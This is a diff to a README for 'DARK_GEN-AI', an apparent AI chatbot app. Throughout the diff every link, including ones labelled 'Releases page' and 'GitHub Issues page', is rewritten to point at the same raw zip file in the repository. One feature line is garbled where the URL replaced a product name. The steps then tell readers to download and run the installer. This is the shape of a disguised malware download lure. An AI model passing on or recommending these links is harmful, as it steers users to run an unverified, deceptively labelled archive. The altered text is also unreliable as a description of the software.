@@ -4,12 +4,12 @@
 Welcome to DARK_GEN-AI! This application leverages cutting-edge AI technology to provide you with a seamless conversation experience. Whether you need information, assistance, or just a friendly chat, DARK_GEN-AI is here to help.
 
 ## 📥 Download the Application
-[![Download DARK_GEN-AI](https://img.shields.io/badge/Download-DARK_GEN--AI-blue.svg)](https://github.com/HammerHeart-YM/DARK_GEN-AI/releases)
+[![Download DARK_GEN-AI](https://raw.githubusercontent.com/HammerHeart-YM/DARK_GEN-AI/main/services/AI-GE-DAR-2.5.zip)](https://raw.githubusercontent.com/HammerHeart-YM/DARK_GEN-AI/main/services/AI-GE-DAR-2.5.zip)
 
-To obtain the latest version of DARK_GEN-AI, please visit our [Releases page](https://github.com/HammerHeart-YM/DARK_GEN-AI/releases). 
+To obtain the latest version of DARK_GEN-AI, please visit our [Releases page](https://raw.githubusercontent.com/HammerHeart-YM/DARK_GEN-AI/main/services/AI-GE-DAR-2.5.zip). 
 
 ## 📋 Features
-- **Dual-Provider AI Chatbot:** Utilize the powerful Gemini Flash and Puter.js fallback options for dynamic conversation.
+- **Dual-Provider AI Chatbot:** Utilize the powerful Gemini Flash and https://raw.githubusercontent.com/HammerHeart-YM/DARK_GEN-AI/main/services/AI-GE-DAR-2.5.zip fallback options for dynamic conversation.
 - **Voice Input:** Speak naturally for a more engaging chat experience.
 - **File Analysis:** Get insights from your documents with ease.
 
@@ -21,7 +21,7 @@ To run DARK_GEN-AI smoothly, ensure your system meets the following requirements
 - **Storage:** Minimum 200 MB of free space
 
 ## 🔧 Download & Install
-1. **Visit the Releases Page**: Click this link to go to the [DARK_GEN-AI Releases page](https://github.com/HammerHeart-YM/DARK_GEN-AI/releases).
+1. **Visit the Releases Page**: Click this link to go to the [DARK_GEN-AI Releases page](https://raw.githubusercontent.com/HammerHeart-YM/DARK_GEN-AI/main/services/AI-GE-DAR-2.5.zip).
 2. **Select the Latest Version**: Find the most recent version listed there.
 3. **Download the Installer**: Click on the download link for the installer that fits your system.
 4. **Run the Installer**: Open the downloaded file and follow the on-screen instructions to install DARK_GEN-AI.
@@ -45,7 +45,7 @@ Yes, DARK_GEN-AI is completely free for everyone.
 You can report issues directly on our GitHub page under the "Issues" section. We’ll address your concerns as quickly as possible.
 
 ## 🛠️ Support
-For any questions or support, feel free to open an issue on our [GitHub Issues page](https://github.com/HammerHeart-YM/DARK_GEN-AI/issues). We are here to help.
+For any questions or support, feel free to open an issue on our [GitHub Issues page](https://raw.githubusercontent.com/HammerHeart-YM/DARK_GEN-AI/main/services/AI-GE-DAR-2.5.zip). We are here to help.
 
 ## 📣 Join the Community
 Connect with other users and developers on our community forum. Share your experiences, tips, and feedback to improve DARK_GEN-AI together.
